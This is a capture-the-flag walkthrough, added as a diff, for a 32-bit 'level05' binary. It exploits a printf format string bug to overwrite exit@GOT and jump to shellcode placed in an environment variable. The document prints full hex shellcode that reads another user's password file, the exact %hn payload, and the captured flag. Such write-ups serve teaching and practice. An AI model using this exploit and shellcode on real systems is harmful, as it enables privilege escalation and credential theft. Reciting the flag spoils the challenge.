@@ -1,0 +1,168 @@
+# Level05 Walkthrough
+
+## Vulnerability
+
+**Format String Attack** - The program passes user input directly to `printf()` without a format specifier:
+
+```c
+printf(s);  // Should be: printf("%s", s);
+```
+
+## Constraints
+
+1. Input is limited to 100 bytes via `fgets()`
+2. Uppercase letters (A-Z) are converted to lowercase (XOR with 0x20)
+3. Program calls `exit(0)` after printf
+
+## Information Gathering with GDB PEDA
+
+### Step 1: Find exit@GOT Address
+
+```bash
+gdb level05
+(gdb) disas exit
+# Shows: <exit@plt>
+
+(gdb) disas 0x08048370  # Address from disassembly
+# Shows the PLT stub that jumps to GOT
+
+# Or use objdump:
+objdump -R level05 | grep exit
+# Output: 080497e0 R_386_JUMP_SLOT   exit
+```
+
+**Result**: `exit@GOT = 0x080497e0`
+
+### Step 2: Test Format String Vulnerability
+
+```bash
+gdb level05
+(gdb) run
+# Input: AAAA %x %x %x %x %x %x %x %x %x %x
+# Output shows stack values, look for 41414141 (AAAA in hex)
+
+# Find position of our input on stack:
+(gdb) run
+# Input: AAAA %10$x
+# If output shows 41414141, our input is at position 10
+```
+
+**Result**: Our input buffer is at stack position 10
+
+### Step 3: Find Shellcode Address in Environment
+
+```bash
+# First, export shellcode outside GDB
+export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x31\xdb..."'`
+
+# Then in GDB:
+gdb level05
+(gdb) break main
+(gdb) run
+(gdb) x/200s environ
+# Look for "SHELLCODE=" in the output
+# Note the address where the actual shellcode starts (after "SHELLCODE=")
+
+# Or use this command to find it directly:
+(gdb) find &environ, +99999, "SHELLCODE"
+# Then examine that address:
+(gdb) x/s 0xffffd??? # Address from find command
+# Add offset to skip "SHELLCODE=" (10 bytes) and reach the NOP sled
+```
+
+**Important**: The address in GDB will be slightly different from normal execution due to environment differences. You may need to adjust by ±20 bytes.
+
+### Step 4: Verify Format String Write Position
+
+```bash
+gdb level05
+(gdb) run
+# Input: AAAA BBBB %10$x %11$x
+# Output should show: 41414141 42424242
+# This confirms positions 10 and 11 point to our input
+```
+
+### Step 5: Calculate Padding Values
+
+Once you have:
+- `exit@GOT = 0x080497e0` (low bytes) and `0x080497e2` (high bytes)
+- `shellcode_addr = 0xffffd87c` (example)
+
+Calculate:
+```python
+# Split address into two shorts
+low_bytes  = 0xd87c = 55420
+high_bytes = 0xffff = 65535
+
+# Padding calculations (we write 8 bytes of addresses first)
+padding1 = 55420 - 8 = 55412
+padding2 = 65535 - 55420 = 10115
+```
+
+### Step 6: Test the Exploit in GDB
+
+```bash
+gdb level05
+(gdb) run < <(python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55412d%10\$hn' + '%10115d%11\$hn'")
+
+# Check if exit@GOT was overwritten:
+(gdb) x/x 0x080497e0
+# Should show the shellcode address
+
+# If it segfaults, adjust the shellcode address by ±4, ±8, ±12 bytes
+```
+
+## Exploit Strategy
+
+Since we can't use uppercase bytes in our input, we store shellcode in an environment variable and use the format string vulnerability to overwrite `exit@GOT` with the shellcode address.
+
+### Step 1: Export Shellcode
+
+```bash
+export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
+```
+
+This shellcode reads `/home/users/level06/.pass` and prints it.
+
+### Step 2: Find Addresses
+
+**exit@GOT**: `0x080497e0` (found with `objdump -R level05`)
+
+**Shellcode address**: `0xffffd87c` (found empirically - varies by environment)
+
+### Step 3: Build Payload
+
+We write the shellcode address to `exit@GOT` in two 2-byte chunks using `%hn`:
+
+```
+[exit@GOT_low][exit@GOT_high][padding1][%10$hn][padding2][%11$hn]
+```
+
+**Address breakdown**:
+- Low bytes:  `0xd87c` = 55420
+- High bytes: `0xffff` = 65535
+
+**Padding calculations**:
+- First write:  `55420 - 8` (addresses) = `55412`
+- Second write: `65535 - 55420` = `10115`
+
+### Step 4: Execute
+
+```bash
+python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55412d%10\$hn' + '%10115d%11\$hn'" | ./level05
+```
+
+## How It Works
+
+1. Format string writes `0xffffd87c` to `exit@GOT` (in two 2-byte chunks)
+2. When `exit(0)` is called, it jumps to our shellcode instead
+3. Shellcode reads and prints the password file
+4. Flag: `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
+
+## Key Concepts
+
+- **Format string vulnerability**: Using `%n` to write to arbitrary memory
+- **GOT overwriting**: Redirecting library function calls
+- **Short writes (`%hn`)**: Writing 2 bytes at a time to avoid huge padding
+- **Direct parameter access**: Using `%10$hn` to access specific stack positions
+- **Environment variable shellcode**: Bypassing input filtering
